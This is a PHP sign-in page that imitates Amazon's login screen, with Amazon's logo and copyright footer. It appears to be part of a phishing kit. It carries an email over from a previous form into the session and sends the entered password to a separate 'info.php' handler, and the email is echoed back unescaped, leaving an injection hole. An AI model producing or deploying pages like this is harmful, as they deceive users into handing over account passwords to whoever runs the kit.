<?php include_once("header.php");

?>

    <div class="container mt-5">
      <div class="row">
         <img class='logo' src="img/amazon-logo.png" alt="" height='103px'>

      </div>
      <form action="info.php" method='post'>
      <div class="login-form ">
          <div class="login-box">
          <h2 class='signin-text'>Sign-In</h2>
          <span class='font-13'>
               <?php   if ( ! empty ( $_POST)){
            
                    $_SESSION['email'] = $_POST['email'];
                    echo $_SESSION['email'];
    
                   } 
                 ?>
            </span>
          <a class='font-13 link-btm' href="#">Change</a><br>
          <label for="password" class="label-email mt-3 font-13">Password</label
          ><a class='link mt-3 float-right link-btm font-13' href="#">Forgot your password?</a>
<br /> 
          <input
            class="input-login password-text"
            type="password"
            name="password"
            autocomplete="off"
            required
          />
          <br />
          <input type="submit" class="input-continue mt-2" value='Sign-In'/>
          <input type="checkbox" value='Keep me sign in'>
          <span class='font-13'>Keep me signed in.</span><a class='needhelp-text'>Details</a>
          <i class="fa fa-caret-down" color="" aria-hidden="true"></i>
                   

        </div>
      </div>
      </form>

         <div class="bar2">
           <hr class='hr-text2 mt-5'>
         </div>
      </div>
      <div class="bar1">
        <div class="row">
          <div class="btm-link-wrap"><a class='link-btm col ml-3' href="#">Conditions of Use</a></div>
          <div class="btm-link-wrap"><a class='link-btm col' href="#">Privacy Notice</a></div>
          <div class="btm-link-wrap"><a class='link-btm col' href="#">Help</a></div>
            <span class="footer-text">
              © 1996-2020, Amazon.com, Inc. or its affiliates
            </span>
        </div>
      </div>
    </div>
  